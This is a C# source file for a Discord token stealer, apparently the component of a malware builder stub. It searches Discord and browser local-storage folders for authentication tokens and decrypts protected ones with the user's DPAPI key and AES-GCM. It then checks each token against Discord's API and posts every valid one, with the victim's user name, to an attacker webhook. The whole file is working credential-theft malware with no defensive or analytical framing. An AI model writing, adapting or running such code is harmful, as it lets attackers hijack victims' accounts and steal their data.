using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Engines;
using System.Security.Cryptography;
using System.Web.Script.Serialization;
using System.Runtime.Remoting.Messaging;
using Newtonsoft.Json.Linq;

namespace DCB.stub.components
{
    internal class tokenstealer
    {
        static List<string> tokens = new List<string>();
        private static readonly HttpClient _httpClient = new HttpClient();

        public static bool Check(string token)
        {
            try
            {
                _httpClient.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue(token);
                HttpResponseMessage response = _httpClient.GetAsync("https://discord.com/api/v10/users/@me").Result;
                return response.IsSuccessStatusCode;
            }
            catch (Exception)
            {
                return false;
            }
        }

        public static void stealtokens()
        {
            List<string> locations = new List<string>();
            var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            locations.Add(appdata + "\\discord\\Local Storage\\leveldb\\");
            locations.Add(appdata + "\\discordcanary\\Local Storage\\leveldb\\");
            locations.Add(appdata + "\\discordptb\\Local Storage\\leveldb\\");
            locations.Add(appdata + "\\Lightcord\\Local Storage\\leveldb\\");
            locations.Add(appdata + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\");
            locations.Add(appdata + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\");
            locations.Add(appdata + "\\Mozilla\\Firefox\\Profiles");
            locations.Add(localappdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\");
            locations.Add(localappdata + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\");
            locations.Add(localappdata + "\\Chromium\\User Data\\Default\\Local Storage\\leveldb\\");
            locations.Add(localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default");
            locations.Add(localappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\");
            locations.Add(localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
            locations.Add(localappdata + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\");
            locations.Add(localappdata + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\");
            foreach (var path in locations)
            {
                if (!Directory.Exists(path)) continue;
                if (path.Contains("Mozilla"))
                {
                    try
                    {
                        foreach (var file in new DirectoryInfo(path).GetFiles("*.sqlite", SearchOption.AllDirectories))
                        {
                            foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}"))
                            {
                                if (Check(match.Value) == true && !tokens.Contains(match.Value))
                                {
                                    tokens.Add(match.Value);
                                    if (Settings.Ping)
                                    {
                                        webhook.sendmessage($"@everyone\ntoken found\n PC name: {Environment.UserName}\n{match.Value}");
                                    }
                                    else
                                    {
                                        webhook.sendmessage($"token found\n PC name: {Environment.UserName}\n{match.Value}");
                                    }
                                }
                            }
                        }
                    } catch
                    {

                    }
                }
                else if (path.Contains("cord"))
                {
                    try
                    {
                        foreach (var file in new DirectoryInfo(path).GetFiles("*.ldb", SearchOption.AllDirectories))
                        {
                            foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), "(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)"))
                            {
                                dynamic deserialize = new JavaScriptSerializer().DeserializeObject(File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local State"));
                                AeadParameters parameters = new AeadParameters(new KeyParameter(ProtectedData.Unprotect(Convert.FromBase64String((string)deserialize["os_crypt"]["encrypted_key"]).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser)), 128, Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]).Skip(3).Take(12).ToArray(), null);
                                GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
                                cipher.Init(false, parameters);
                                byte[] bytes = new byte[cipher.GetOutputSize(Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]).Skip(15).ToArray().Length)];
                                cipher.DoFinal(bytes, cipher.ProcessBytes(Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]).Skip(15).ToArray(), 0, Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]).Skip(15).ToArray().Length, bytes, 0));
                                string token = Encoding.UTF8.GetString(bytes).TrimEnd("\r\n\0".ToCharArray());
                                if (Check(token) == true && !tokens.Contains(token))
                                {
                                    tokens.Add(token);
                                    if (Settings.Ping)
                                    {
                                        webhook.sendmessage($"@everyone\ntoken found\n PC name: {Environment.UserName}\n{token}");
                                    }
                                    else
                                    {
                                        webhook.sendmessage($"token found\n PC name: {Environment.UserName}\n{token}");
                                    }
                                }
                                    
                                
                            }
                        }
                    } catch
                    {

                    }
                    
                }
                else
                {
                    try
                    {
                        foreach (var file in new DirectoryInfo(path).GetFiles())
                        {
                            if (file.Equals("LOCK")) continue;
                            foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}"))
                            {
                                if (Check(match.Value) == true && !tokens.Contains(match.Value))
                                {
                                    tokens.Add(match.Value);
                                    if (Settings.Ping)
                                    {
                                        webhook.sendmessage($"@everyone\ntoken found\n PC name: {Environment.UserName}\n{match.Value}");
                                    }
                                    else
                                    {
                                        webhook.sendmessage($"token found\n PC name: {Environment.UserName}\n{match.Value}");
                                    }
                                }
                            }
                        }
                    } catch
                    {

                    }
                    
                }
            }
        }
    }
}
